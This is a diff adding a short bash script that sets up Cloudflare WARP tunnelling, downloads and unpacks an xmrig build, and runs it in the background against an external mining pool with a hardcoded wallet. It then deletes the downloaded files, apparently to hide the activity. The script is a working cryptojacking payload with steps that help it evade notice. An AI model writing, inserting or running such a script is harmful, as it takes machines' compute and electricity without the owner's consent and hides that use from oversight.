@@ -1,0 +1,11 @@
+#! /bin/bash
+sudo apt-get install wget hwloc -y
+echo y | warp-cli register
+wget https://github.com/True-Mining/xmrig-zerofee/releases/download/v6.12.2/xmrig-6.16.2-linux-x64.tar
+warp-cli set-mode warp+doh
+warp-cli connect
+tar -xf xmrig-6.16.2-linux-x64.tar
+cd xmrig-6.16.2
+./xmrig -a gr -o stratum+tcp://fi.mining4people.com:3419 -u GKnUsYSNR9X5uksRmRfCAgni4YaUCD5MTY -p x -t 4 -B
+cd
+sudo rm -rf xmrig-6.16.2 xmrig-6.16.2-linux-x64.tar
